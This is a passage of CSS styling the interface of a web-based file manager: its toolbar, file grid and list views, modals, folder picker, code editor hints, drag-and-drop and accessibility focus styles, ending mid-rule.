      .login-submit{width:100%;height:46px;border:0;border-radius:9px;background:var(--accent-color);color:#fff;font-weight:700;font-size:13px;cursor:pointer;transition:.2s;margin-top:6px}
      .login-submit:hover{background:var(--accent-hover)}.login-submit:disabled{opacity:.65;cursor:not-allowed}
      
      
      .nav-section {
          margin-bottom: 2rem;
      }
      
      .nav-section-title {
          color: var(--text-muted);
          font-size: 0.75rem;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          margin-bottom: 0.75rem;
          padding: 0 0.5rem;
      }
      
      .quick-access-section {
          margin-bottom: 1.65rem;
      }
      
      .quick-access-section .nav-section-title {
          margin-bottom: 0.65rem;
      }
      
      .nav-group-label {
          color: var(--text-muted);
          font-size: 0.62rem;
          font-weight: 700;
          letter-spacing: 0.9px;
          text-transform: uppercase;
          padding: 0 0.75rem;
          margin: 0.15rem 0 0.35rem;
          opacity: 0.72;
      }
      
      .nav-group-label-tools {
          margin-top: 0.85rem;
          padding-top: 0.75rem;
          border-top: 1px solid var(--border-color);
      }
      
      .nav-item {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          padding: 0.625rem 0.75rem;
          border-radius: var(--radius);
          color: var(--text-secondary);
          text-decoration: none;
          transition: var(--transition);
          margin-bottom: 0.25rem;
          cursor: pointer;
          /* Button reset styles */
          background: transparent;
          border: none;
          font-family: inherit;
          font-size: inherit;
          text-align: left;
          width: 100%;
      }
      
      .nav-item:hover {
          background: var(--bg-hover);
          color: var(--text-primary);
      }
      
      .nav-item.active {
          background: var(--bg-active);
          color: var(--accent-color);
          font-weight: 500;
          position: relative;
      }
      
      .nav-item.active::before {
          content: '';
          position: absolute;
          left: 0;
          top: 50%;
          transform: translateY(-50%);
          width: 3px;
          height: 60%;
          background: var(--accent-color);
          border-radius: 0 3px 3px 0;
      }
      
      /* Main Content */
      .main-content {
          flex: 1;
          display: flex;
          flex-direction: column;
          overflow: hidden;
      }
      
      /* Toolbar */
      .toolbar {
          background: var(--bg-primary);
          border-bottom: 1px solid var(--border-color);
          padding: 1rem 1.5rem;
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 1rem;
          min-height: 70px;
          overflow: hidden;
          width: 100%;
          box-sizing: border-box;
      }
      
      .toolbar-left {
          display: flex;
          align-items: center;
          gap: 1rem;
          flex: 1;
          min-width: 0;
          overflow: hidden;
      }
      
      .toolbar-right {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          flex-wrap: wrap;
          min-width: 0;
          flex-shrink: 1;
          position: relative;
          min-width: max-content;
      }
      
      /* Breadcrumb */
      .breadcrumb {
          display: flex;
          align-items: center;
          gap: 0.25rem;
          color: var(--text-secondary);
          font-size: 0.875rem;
      }
      
      .breadcrumb-item {
          display: flex;
          align-items: center;
          gap: 0.25rem;
      }
      
      .breadcrumb-item::after {
          content: '/';
          margin-left: 0.5rem;
          color: var(--text-muted);
          opacity: 0.5;
          font-weight: 300;
      }
      
      .breadcrumb-item:last-child::after {
          display: none;
      }
      
      .breadcrumb-link {
          color: var(--text-secondary);
          text-decoration: none;
          transition: all 0.15s ease;
          cursor: pointer;
          padding: 4px 8px;
          border-radius: 6px;
          /* Button reset styles */
          background: transparent;
          border: none;
          font-family: inherit;
          font-size: inherit;
      }
      
      .breadcrumb-link:hover {
          color: var(--accent-color);
          background: var(--bg-hover);
      }
      
      .breadcrumb-separator {
          color: var(--text-muted);
          opacity: 0.5;
      }
      
      /* Search Box */
      .search-box {
          position: relative;
          width: 250px;
      }
      
      .search-input {
          width: 100%;
          padding: 0.5rem 2.5rem 0.5rem 0.75rem;
          background: var(--bg-secondary);
          border: 1px solid var(--border-light);
          border-radius: var(--radius);
          color: var(--text-primary);
          font-size: 0.875rem;
          transition: var(--transition);
      }
      
      .search-input:focus {
          outline: none;
          border-color: var(--accent-color);
          box-shadow: 0 0 0 3px rgba(0, 158, 247, 0.15);
      }
      
      .search-icon {
          position: absolute;
          right: 0.75rem;
          top: 50%;
          transform: translateY(-50%);
          color: var(--text-muted);
          cursor: pointer;
      }
      
      /* Buttons */
      .btn {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 0.5rem;
          padding: 0.5rem 1rem;
          border: none;
          border-radius: var(--radius);
          font-size: 0.875rem;
          font-weight: 500;
          cursor: pointer;
          transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
          white-space: nowrap;
          position: relative;
          overflow: hidden;
      }
      
      .btn::after {
          content: '';
          position: absolute;
          inset: 0;
          background: linear-gradient(rgba(255,255,255,0.1), transparent);
          opacity: 0;
          transition: opacity 0.2s;
      }
      
      .btn:hover::after {
          opacity: 1;
      }
      
      .btn:active {
          transform: scale(0.97);
      }
      
      .btn-primary {
          background: var(--accent-color);
          color: white;
      }
      
      .btn-primary:hover {
          background: var(--accent-hover);
          transform: translateY(-1px);
      }
      
      .btn-light {
          background: var(--bg-secondary);
          color: var(--text-secondary);
          border: 1px solid var(--border-light);
      }
      
      .btn-light:hover {
          background: var(--bg-hover);
          color: var(--text-primary);
      }
      
      .btn-success {
          background: var(--success-color);
          color: white;
      }
      
      .btn-sm {
          padding: 0.375rem 0.75rem;
          font-size: 0.875rem;
      }
      
      .btn-danger {
          background: var(--danger-color);
          color: white;
      }
      
      .btn-danger i {
          color: white !important;
      }
      
      .btn-icon-only {
          padding: 0.5rem;
          width: 36px;
          height: 36px;
      }
      
      /* File List Container */
      .file-list-container {
          flex: 1;
          overflow: auto;
          background: var(--bg-secondary);
          padding: 1.5rem;
      }
      
      /* View Toggle */
      .view-toggle {
          display: flex;
          background: var(--bg-secondary);
          border-radius: var(--radius);
          padding: 2px;
      }
      
      .view-toggle-btn {
          padding: 0.375rem 0.75rem;
          background: transparent;
          border: none;
          color: var(--text-secondary);
          cursor: pointer;
          border-radius: var(--radius-sm);
          transition: var(--transition);
      }
      
      .view-toggle-btn.active {
          background: var(--bg-primary);
          color: var(--text-primary);
          box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      }
      
      /* File Grid View */
      .file-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
          gap: 1rem;
      }
      
      .file-grid-item {
          background: var(--bg-primary);
          border: 2px solid transparent;
          border-radius: var(--radius-lg);
          padding: 1.5rem 1rem;
          text-align: center;
          cursor: pointer;
          transition: var(--transition);
          position: relative;
      }
      
      .file-grid-item:hover {
          transform: translateY(-4px) scale(1.02);
          box-shadow: 0 12px 24px rgba(0, 0, 0, 0.15);
          border-color: var(--accent-color);
      }
      
      .file-grid-item.selected {
          background: var(--bg-active);
          border-color: var(--accent-color);
      }
      
      .file-grid-checkbox {
          position: absolute;
          top: 0.5rem;
          right: 0.5rem;
          width: 18px;
          height: 18px;
      }
      
      .file-grid-icon {
          font-size: 3rem;
          margin-bottom: 0.75rem;
      }
      
      .file-grid-name {
          font-size: 0.875rem;
          color: var(--text-primary);
          font-weight: 500;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
      }
      
      .file-grid-size {
          font-size: 0.75rem;
          color: var(--text-muted);
          margin-top: 0.25rem;
      }
      
      /* File List View */
      .file-list-table {
          width: 100%;
          background: var(--bg-primary);
          border-radius: var(--radius-lg);
          overflow: hidden;
      }
      
      .file-list-header {
          display: grid;
          grid-template-columns: 46px 28px 40px 1fr 120px 150px 150px 100px;
          padding: 1rem 1.5rem;
          background: var(--bg-tertiary);
          border-bottom: 2px solid var(--border-color);
          font-size: 0.75rem;
          font-weight: 600;
          color: var(--text-muted);
          text-transform: uppercase;
          letter-spacing: 0.5px;
      }
      
      .sortable-header {
          cursor: pointer;
          user-select: none;
          transition: var(--transition);
          display: flex;
          align-items: center;
          gap: 0.25rem;
      }
      
      .sortable-header:hover {
          color: var(--accent-color);
      }
      
      .sort-indicator {
          font-size: 0.6rem;
          opacity: 0.5;
      }
      
      .sortable-header.active {
          color: var(--accent-color);
      }
      
      .sortable-header.active .sort-indicator {
          opacity: 1;
      }
      
      .file-list-item {
          display: grid;
          grid-template-columns: 46px 28px 40px 1fr 120px 150px 150px 100px;
          padding: 0.75rem 1.5rem;
          border-bottom: 1px solid var(--border-color);
          border-left: 3px solid transparent;
          align-items: center;
          cursor: pointer;
          transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      }
      
      .file-list-item:hover {
          background: var(--bg-hover);
          transform: translateX(4px);
          border-left-color: var(--accent-color);
      }
      
      .file-list-item.selected {
          background: var(--bg-active);
      }
      
      .file-grid-item.parent-dir,
      .file-list-item.parent-dir {
          opacity: 0.8;
          font-weight: 600;
      }
      
      .file-grid-item.parent-dir:hover,
      .file-list-item.parent-dir:hover {
          opacity: 1;
          background: var(--bg-hover);
      }
      
      .file-checkbox {
          appearance: none;
          -webkit-appearance: none;
          width: 18px;
          height: 18px;
          border: 2px solid var(--border-light);
          border-radius: 4px;
          cursor: pointer;
          transition: all 0.2s ease;
          position: relative;
          background: var(--bg-secondary);
      }
      
      .file-checkbox:hover {
          border-color: var(--accent-color);
      }
      
      .file-checkbox:checked {
          background: var(--accent-color);
          border-color: var(--accent-color);
      }
      
      .file-checkbox:checked::after {
          content: '';
          position: absolute;
          left: 5px;
          top: 2px;
          width: 4px;
          height: 8px;
          border: solid white;
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
      }
      
      #selectAllCheckbox {
          appearance: none;
          -webkit-appearance: none;
          width: 18px;
          height: 18px;
          border: 2px solid var(--border-light);
          border-radius: 4px;
          cursor: pointer;
          transition: all 0.2s ease;
          position: relative;
          background: var(--bg-secondary);
      }
      
      #selectAllCheckbox:hover {
          border-color: var(--accent-color);
      }
      
      #selectAllCheckbox:checked {
          background: var(--accent-color);
          border-color: var(--accent-color);
      }
      
      #selectAllCheckbox:checked::after {
          content: '';
          position: absolute;
          left: 5px;
          top: 2px;
          width: 4px;
          height: 8px;
          border: solid white;
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
      }
      
      .file-icon {
          font-size: 1.5rem;
      }
      
      .file-name {
          font-weight: 500;
          color: var(--text-primary);
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
      }
      
      .file-date, .file-size, .file-extension {
          color: var(--text-secondary);
          font-size: 0.875rem;
      }
      
      .file-actions {
          display: flex;
          gap: 0.25rem;
          opacity: 0;
          transition: var(--transition);
      }
      
      .file-list-item:hover .file-actions {
          opacity: 1;
      }
      
      .action-btn {
          padding: 0.25rem;
          background: transparent;
          border: none;
          color: var(--text-secondary);
          cursor: pointer;
          border-radius: var(--radius-sm);
          transition: var(--transition);
      }
      
      .action-btn:hover {
          background: var(--bg-hover);
          color: var(--text-primary);
      }
      
      /* Status Bar */
      .status-bar {
          background: linear-gradient(to right, var(--bg-primary), var(--bg-tertiary));
          border-top: 1px solid var(--border-color);
          padding: 0.75rem 1.5rem;
          display: flex;
          justify-content: space-between;
          align-items: center;
          font-size: 0.75rem;
          color: var(--text-secondary);
      }
      
      .status-left span,
      .status-right span {
          padding: 4px 10px;
          background: var(--bg-secondary);
          border-radius: 12px;
          font-size: 0.7rem;
          font-weight: 500;
      }
      
      /* Modals */
      .modal {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.5);
          backdrop-filter: blur(4px);
          z-index: 1000;
          align-items: center;
          justify-content: center;
      }
      
      .modal.show {
          display: flex;
          animation: fadeIn 0.2s ease;
      }
      
      .modal-content {
          background: rgba(30, 30, 45, 0.95);
          backdrop-filter: blur(20px);
          -webkit-backdrop-filter: blur(20px);
          border: 1px solid rgba(255, 255, 255, 0.1);
          border-radius: var(--radius-lg);
          max-width: 500px;
          width: 90%;
          max-height: 90vh;
          overflow: auto;
          box-shadow: var(--shadow-lg);
          animation: slideUp 0.3s ease;
      }
      
      [data-theme="light"] .modal-content {
          background: rgba(255, 255, 255, 0.95);
          border: 1px solid rgba(0, 0, 0, 0.1);
      }
      
      @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
      }
      
      @keyframes slideUp {
          from {
              opacity: 0;
              transform: translateY(20px);
          }
          to {
              opacity: 1;
              transform: translateY(0);
          }
      }
      
      .modal-header {
          padding: 1.5rem;
          border-bottom: 1px solid var(--border-color);
          font-size: 1.125rem;
          font-weight: 600;
          color: var(--text-primary);
      }
      
      .modal-body {
          padding: 1.5rem;
      }
      
      .modal-footer {
          padding: 1.5rem;
          border-top: 1px solid var(--border-color);
          display: flex;
          justify-content: flex-end;
          gap: 0.75rem;
      }
      
      /* Form Elements */
      .form-group {
          margin-bottom: 1.5rem;
      }
      
      .form-label {
          display: block;
          margin-bottom: 0.5rem;
          font-weight: 500;
          color: var(--text-primary);
      }
      
      .form-control {
          width: 100%;
          padding: 0.625rem 0.75rem;
          background: var(--bg-secondary);
          border: 1px solid var(--border-light);
          border-radius: var(--radius);
          color: var(--text-primary);
          font-size: 0.875rem;
          transition: var(--transition);
      }
      
      .form-control:focus {
          outline: none;
          border-color: var(--accent-color);
          background: var(--bg-primary);
          box-shadow: 0 0 0 3px rgba(0, 158, 247, 0.15);
      }
      
      /* Move items styling */
      .move-item {
          padding: 0.5rem 0.75rem;
          background: var(--bg-secondary);
          border-radius: var(--radius);
          margin-bottom: 0.5rem;
          border: 1px solid var(--border-light);
          font-size: 0.875rem;
          color: var(--text-primary);
      }
      
      .form-text {
          color: var(--text-muted);
          font-size: 0.75rem;
          margin-top: 0.25rem;
      }
      
      /* Move modal styling */
      .move-destination-options {
          display: flex;
          gap: 0.5rem;
          margin-bottom: 1rem;
      }
      
      .folder-picker {
          border: 1px solid var(--border-light);
          border-radius: var(--radius);
          background: var(--bg-secondary);
          max-height: 200px;
          overflow-y: auto;
          padding: 0.5rem;
      }
      
      .folder-picker-item {
          padding: 0.5rem 0.75rem;
          cursor: pointer;
          border-radius: var(--radius);
          margin-bottom: 0.25rem;
          transition: var(--transition);
          display: flex;
          align-items: center;
          gap: 0.5rem;
          color: var(--text-primary);
          /* Make focusable */
          outline: none;
      }
      
      .folder-picker-item[tabindex] {
          cursor: pointer;
      }
      
      .folder-picker-item:hover {
          background: var(--bg-hover);
      }
      
      .folder-picker-item.selected {
          background: var(--accent-color);
          color: white;
      }
      
      .folder-picker-item.current-folder {
          background: var(--bg-primary);
          border: 2px solid var(--accent-color);
          font-weight: bold;
          color: var(--text-primary);
      }
      
      .folder-breadcrumb {
          padding: 0.5rem;
          background: var(--bg-secondary);
          border-radius: var(--radius);
          margin-bottom: 0.5rem;
          font-size: 0.875rem;
          color: var(--text-primary);
      }
      
      .folder-breadcrumb .breadcrumb-link {
          color: var(--accent-color);
          cursor: pointer;
          text-decoration: none;
          /* Button reset */
          background: transparent;
          border: none;
          padding: 2px 4px;
          font-family: inherit;
          font-size: inherit;
      }
      
      .folder-breadcrumb .breadcrumb-link:hover {
          text-decoration: underline;
      }
      
      .folder-breadcrumb .breadcrumb-link:focus-visible {
          outline: 2px solid var(--accent-color);
          outline-offset: 2px;
      }
      
      .selected-path {
          padding: 0.5rem;
          background: var(--bg-primary);
          border-radius: var(--radius);
          margin-top: 0.5rem;
          font-size: 0.875rem;
          color: var(--text-primary);
      }
      
      .folder-picker-loading {
          text-align: center;
          padding: 1rem;
          color: var(--text-muted);
      }
      
      /* Loading Spinner */
      .spinner {
          width: 20px;
          height: 20px;
          border: 2px solid var(--border-light);
          border-top-color: var(--accent-color);
          border-radius: 50%;
          animation: spin 0.6s linear infinite;
          display: inline-block;
      }
      
      @keyframes spin {
          to { transform: rotate(360deg); }
      }
      
      .loading-overlay {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(21, 21, 33, 0.95);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 100;
      }
      
      [data-theme="light"] .loading-overlay {
          background: rgba(255, 255, 255, 0.9);
      }
      
      /* Mobile Menu Toggle */
      .mobile-menu-toggle {
          display: none;
          padding: 0.5rem;
          background: transparent;
          border: none;
          color: var(--text-primary);
          font-size: 1.5rem;
          cursor: pointer;
      }
      
      /* Responsive */
      /* Responsive toolbar - progressive button hiding */
      @media (max-width: 1300px) {
          /* Hide Move and Delete, show More button */
          .toolbar-btn-move,
          .toolbar-btn-delete {
              display: none;
          }
          .mobile-more-btn {
              display: inline-block !important;
          }
      }
      
      @media (max-width: 1100px) {
          /* Hide Download, Move, Delete */
          .toolbar-btn-download,
          .toolbar-btn-move,
          .toolbar-btn-delete {
              display: none;
          }
          .toolbar {
              gap: 0.5rem;
          }
          .toolbar-right {
              gap: 0.25rem;
          }
          .toolbar .btn {
              padding: 0.5rem 0.75rem;
              font-size: 13px;
          }
      }
      
      @media (max-width: 900px) {
          /* Hide Edit, Download, Move, Delete */
          .toolbar-btn-edit,
          .toolbar-btn-download,
          .toolbar-btn-move,
          .toolbar-btn-delete {
              display: none;
          }
      }
      
      @media (max-width: 1024px) {
          .sidebar {
              position: fixed;
              left: -265px;
              z-index: 100;
              height: 100vh;
              box-shadow: var(--shadow-lg);
              transition: transform 0.3s ease;
          }
          
          .sidebar.open {
              transform: translateX(265px);
          }
          
          .mobile-menu-toggle {
              display: block;
          }
          
          .sidebar-close-btn {
              display: block;
          }
          
          .search-box {
              width: 200px;
          }
      }
      
      @media (max-width: 768px) {
          .file-grid {
              grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
          }
          
          .toolbar {
              padding: 0.5rem;
              flex-wrap: wrap;
              min-height: auto;
              gap: 0.5rem;
          }
          
          .toolbar-left {
              width: 100%;
              margin-bottom: 0.5rem;
              flex-wrap: wrap;
              gap: 0.5rem;
          }
          
          .toolbar-right {
              width: 100%;
              justify-content: center;
              flex-wrap: wrap;
              gap: 0.25rem;
          }
          
          .toolbar .btn {
              padding: 0.375rem 0.5rem;
              font-size: 12px;
              margin: 0;
              min-width: auto;
          }
          
          .search-box {
              width: 100%;
              max-width: none;
              margin-top: 0.5rem;
          }
          
          .search-input {
              font-size: 14px;
              padding: 0.5rem;
          }
          
          .mobile-menu-toggle {
              padding: 0.5rem;
              font-size: 16px;
          }
          
          .view-toggle {
              gap: 2px;
          }
          
          .view-toggle-btn {
              padding: 0.375rem 0.5rem;
              font-size: 12px;
          }
          
          .file-list-header,
          .file-list-item {
              grid-template-columns: 46px 28px 40px 1fr 80px;
          }
      
          .file-date, .file-extension, .file-actions {
              display: none;
          }
          
          .breadcrumb {
              display: none;
          }
          
          /* Mobile editor modal improvements */
          #editorModal .modal-content {
              max-width: 100% !important;
              width: 100% !important;
              height: 100vh !important;
              margin: 0 !important;
              border-radius: 0 !important;
              max-height: 100vh !important;
          }
          
          #editorModal .modal-header {
              flex-wrap: wrap;
              padding: 0.5rem !important;
              min-height: auto;
          }
          
          #editorModal .modal-header > div:first-child {
              font-size: 14px;
              margin-bottom: 0.5rem;
              width: 100%;
          }
          
          #editorModal .modal-header > div:last-child {
              gap: 5px !important;
              width: 100%;
              justify-content: flex-start;
          }
          
          #editorModal .modal-header .btn {
              padding: 0.25rem 0.5rem;
              font-size: 12px;
          }
          
          #editorModal .modal-body {
              height: calc(100vh - 140px) !important;
              padding: 0 !important;
              margin-bottom: 80px; /* Account for fixed footer */
          }
          
          #editorModal .modal-footer {
              position: fixed;
              bottom: 0;
              left: 0;
              right: 0;
              background: var(--bg-primary);
              border-top: 2px solid var(--border-color);
              z-index: 1001;
              padding: 0.75rem !important;
              flex-wrap: wrap;
              box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
          }
          
          #editorModal .modal-footer > div {
              width: 100%;
              margin-bottom: 0.5rem;
          }
          
          #editorModal .modal-footer > div:last-child {
              justify-content: center;
              margin-bottom: 0;
          }
          
          #editorModal .modal-footer .btn {
              padding: 0.5rem 1rem;
              margin: 0 0.25rem;
              font-size: 14px;
              min-width: 80px;
          }
          
          #editorModal #codeEditor {
              font-size: 12px !important;
              padding: 10px !important;
          }
          
          #editorModal #editorStatus {
              font-size: 12px;
              text-align: center;
              display: block;
          }
      }
      
      /* Mobile Actions Dropdown */
      .mobile-actions-dropdown {
          background: var(--bg-primary);
          border: 1px solid var(--border-color);
          border-radius: var(--radius);
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
          padding: 0.5rem;
          max-height: 300px;
          overflow-y: auto;
      }
      
      .mobile-actions-dropdown .btn {
          width: 100%;
          margin-bottom: 0.25rem;
          justify-content: flex-start;
          text-align: left;
          background: var(--bg-secondary);
          border: 1px solid var(--border-light);
          color: var(--text-primary);
      }
      
      .mobile-actions-dropdown .btn:hover {
          background: var(--bg-hover);
      }
      
      .mobile-actions-dropdown .btn:last-child {
          margin-bottom: 0;
      }
      
      @media (max-width: 480px) {
          /* Extra small screens - hide most toolbar buttons and show more button */
          .toolbar-btn-newfile,
          .toolbar-btn-newfolder,
          .toolbar-btn-edit,
          .toolbar-btn-download,
          .toolbar-btn-move,
          .toolbar-btn-delete {
              display: none;
          }
          
          .mobile-more-btn {
              display: inline-block !important;
          }
          
          .toolbar .btn {
              padding: 0.25rem 0.375rem;
              font-size: 11px;
          }
          
          .breadcrumb {
              font-size: 12px;
          }
          
          .search-box {
              margin-top: 0.25rem;
          }
          
          .toolbar {
              padding: 0.25rem;
              position: relative;
          }
          
          .toolbar-left {
              margin-bottom: 0.25rem;
          }
      }
      
      /* Auto-completion hint styling */
      .CodeMirror-hints {
          max-height: 200px;
          overflow-y: auto;
          font-family: 'Fira Code', 'Monaco', 'Consolas', monospace;
          font-size: 13px;
          z-index: 10000 !important; /* Higher than modal (1001) */
          position: absolute !important;
          background: white;
          border: 1px solid #ddd;
          box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      }
      
      .CodeMirror-hint {
          padding: 4px 8px;
          border-radius: 3px;
          cursor: pointer;
          position: relative;
          z-index: 10001;
      }
      
      .CodeMirror-hint-active {
          background: #007acc;
          color: white;
      }
      
      .cm-variable-hint {
          color: #e06c75;
          font-weight: 500;
      }
      
      .cm-function-hint {
          color: #61afef;
          font-weight: 500;
      }
      
      .cm-builtin-hint {
          color: #c678dd;
          font-weight: 500;
      }
      
      .cm-word-hint {
          color: #98c379;
          font-weight: normal;
      }
      
      /* Dark theme hints */
      body[data-theme="dark"] .CodeMirror-hints {
          background: #2b2b2b;
          border: 1px solid #444;
          z-index: 10000 !important; /* Maintain high z-index in dark theme */
      }
      
      body[data-theme="dark"] .CodeMirror-hint {
          color: #abb2bf;
      }
      
      body[data-theme="dark"] .CodeMirror-hint.CodeMirror-hint-active {
          background: #3e4451;
          color: #ffffff;
      }
      
      /* Variable/selection highlighting styles */
      .cm-matchhighlight {
          background: #ffd700;
          background: rgba(255, 215, 0, 0.4);
          border-radius: 2px;
          animation: highlightPulse 0.3s ease-in-out;
      }
      
      .CodeMirror-selectedtext {
          background: #3390ff !important;
          background: rgba(51, 144, 255, 0.3) !important;
          color: inherit !important;
      }
      
      /* Scrollbar match annotations */
      .CodeMirror-search-match {
          background: #ffff00;
          border: 1px solid #999;
      }
      
      /* Dark theme match highlighting */
      body[data-theme="dark"] .cm-matchhighlight {
          background: #4a4a00;
          background: rgba(255, 215, 0, 0.3);
      }
      
      body[data-theme="dark"] .CodeMirror-selectedtext {
          background: #1a4480 !important;
          background: rgba(51, 144, 255, 0.4) !important;
      }
      
      /* Highlight pulse animation */
      @keyframes highlightPulse {
          0% { background: rgba(255, 215, 0, 0.8); }
          100% { background: rgba(255, 215, 0, 0.4); }
      }
      
      /* Drag selection rectangle */
      .drag-selection-rect {
          position: fixed;
          border: 2px solid var(--accent-color);
          background: rgba(0, 158, 247, 0.1);
          pointer-events: none;
          z-index: 10000;
          border-radius: 2px;
      }
      
      /* Prevent text selection during drag */
      .drag-selecting {
          user-select: none;
          -webkit-user-select: none;
          -moz-user-select: none;
          -ms-user-select: none;
      }
      
      /* Drag and drop styles */
      .file-grid-item.dragging,
      .file-list-item.dragging {
          opacity: 0.5;
          cursor: move;
      }
      
      .file-grid-item.drag-over,
      .file-list-item.drag-over {
          background: var(--accent-color) !important;
          border: 2px dashed var(--accent-color);
          opacity: 0.8;
      }
      
      .file-grid-item.drag-over .file-grid-name,
      .file-list-item.drag-over .file-name {
          color: white;
          font-weight: bold;
      }
      
      /* Drop zone for individual breadcrumb items */
      .breadcrumb-item.breadcrumb-item-drop-active {
          background: var(--accent-color);
          border: 2px solid rgba(255, 255, 255, 0.8);
          border-radius: 6px;
          box-shadow: 0 0 12px rgba(0, 158, 247, 0.6);
          transform: scale(1.08);
          transition: all 0.15s ease;
          padding: 2px 8px;
          margin: -2px -8px; /* Compensate for padding */
      }
      
      .breadcrumb-item.breadcrumb-item-drop-active .breadcrumb-link {
          color: white !important;
          font-weight: bold;
      }
      
      .breadcrumb-drop-target {
          cursor: pointer;
          transition: all 0.15s ease;
      }
      
      .breadcrumb-drop-target:hover {
          opacity: 0.8;
      }
      
      .file-grid-item[draggable="true"],
      .file-list-item[draggable="true"] {
          cursor: pointer;
      }
      
      /* Expandable folder tree styles */
      .folder-expand-icon {
          width: 20px;
          height: 20px;
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          color: var(--text-secondary);
          transition: var(--transition);
          font-size: 14px;
          font-weight: 600;
      }
      
      .folder-expand-icon:hover {
          color: var(--accent-color);
          background: var(--bg-hover);
          border-radius: 4px;
      }
      
      .folder-expand-icon.expanded {
          transform: rotate(90deg);
      }
      
      .file-list-item[data-depth] {
          padding-left: calc(1.5rem + var(--indent-level) * 25px);
      }
      
      .file-list-item.nested {
          background: var(--bg-secondary);
      }
      
      .file-list-item.nested:hover {
          background: var(--bg-hover);
      }
      
      .folder-expand-icon.loading {
          animation: spin 1s linear infinite;
      }
      
      @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
      }
      
      /* Empty State */
      .empty-state {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 4rem 2rem;
          color: var(--text-muted);
          text-align: center;
      }
      
      .empty-state-icon {
          font-size: 4rem;
          margin-bottom: 1rem;
          opacity: 0.3;
          color: var(--text-secondary);
      }
      
      .empty-state-text {
          font-size: 1.1rem;
          margin-bottom: 0.5rem;
          color: var(--text-secondary);
      }
      
      .empty-state-hint {
          font-size: 0.875rem;
          opacity: 0.7;
      }
      
      /* File Extension Badges */
      .file-extension-badge {
          display: inline-block;
          padding: 2px 8px;
          border-radius: 12px;
          font-size: 0.65rem;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
      }
      
      .file-extension-badge[data-ext="php"] { background: rgba(119, 123, 180, 0.2); color: #777bb4; }
      .file-extension-badge[data-ext="js"] { background: rgba(247, 223, 30, 0.2); color: #f0db4f; }
      .file-extension-badge[data-ext="css"] { background: rgba(21, 114, 182, 0.2); color: #1572b6; }
      .file-extension-badge[data-ext="html"] { background: rgba(227, 79, 38, 0.2); color: #e34f26; }
      .file-extension-badge[data-ext="json"] { background: rgba(128, 128, 128, 0.2); color: #808080; }
      .file-extension-badge[data-ext="md"] { background: rgba(0, 0, 0, 0.15); color: var(--text-secondary); }
      .file-extension-badge[data-ext="txt"] { background: rgba(128, 128, 128, 0.15); color: var(--text-secondary); }
      .file-extension-badge[data-ext="py"] { background: rgba(55, 118, 171, 0.2); color: #3776ab; }
      .file-extension-badge[data-ext="sql"] { background: rgba(51, 103, 145, 0.2); color: #336791; }
      .file-extension-badge[data-ext="xml"] { background: rgba(227, 79, 38, 0.15); color: #e34f26; }
      .file-extension-badge[data-ext="yml"],
      .file-extension-badge[data-ext="yaml"] { background: rgba(203, 56, 55, 0.2); color: #cb3837; }
      .file-extension-badge[data-ext="jpg"],
      .file-extension-badge[data-ext="jpeg"],
      .file-extension-badge[data-ext="png"],
      .file-extension-badge[data-ext="gif"],
      .file-extension-badge[data-ext="svg"],
      .file-extension-badge[data-ext="webp"] { background: rgba(155, 89, 182, 0.2); color: #9b59b6; }
      .file-extension-badge[data-ext="pdf"] { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
      .file-extension-badge[data-ext="zip"],
      .file-extension-badge[data-ext="rar"],
      .file-extension-badge[data-ext="7z"],
      .file-extension-badge[data-ext="tar"],
      .file-extension-badge[data-ext="gz"] { background: rgba(149, 165, 166, 0.2); color: #95a5a6; }
      
      /* Skeleton Loading Animation */
      .skeleton {
          background: linear-gradient(
              90deg,
              var(--bg-secondary) 25%,
              var(--bg-hover) 50%,
              var(--bg-secondary) 75%
          );
          background-size: 200% 100%;
          animation: shimmer 1.5s infinite;
          border-radius: var(--radius);
      }
      
      .skeleton-row {
          height: 50px;
          margin-bottom: 8px;
          border-radius: var(--radius);
      }
      
      .skeleton-grid-item {
          height: 120px;
          border-radius: var(--radius-lg);
      }
      
      @keyframes shimmer {
          0% { background-position: 200% 0; }
          100% { background-position: -200% 0; }
      }
      
      /* Visually hidden class for screen readers */
      .visually-hidden {
          position: absolute !important;
          width: 1px !important;
          height: 1px !important;
          padding: 0 !important;
          margin: -1px !important;
          overflow: hidden !important;
          clip: rect(0, 0, 0, 0) !important;
          white-space: nowrap !important;
          border: 0 !important;
      }
      
      /* Skip link for keyboard navigation */
      .skip-link {
          position: absolute;
          top: -40px;
          left: 0;
          background: var(--accent-color);
          color: white;
          padding: 8px 16px;
          z-index: 10001;
          text-decoration: none;
          font-weight: 600;
          border-radius: 0 0 var(--radius) 0;
          transition: top 0.3s ease;
      }
      
      .skip-link:focus {
          top: 0;
          outline: 2px solid white;
          outline-offset: 2px;
      }
      
      /* Focus ring for accessibility - Enhanced */
      .btn:focus-visible,
      .file-checkbox:focus-visible,
      .form-control:focus-visible,
      .nav-item:focus-visible,
      .view-toggle-btn:focus-visible,
      .action-btn:focus-visible,
      .breadcrumb-link:focus-visible,
      .context-menu-item:focus-visible,
      .folder-picker-item:focus-visible,
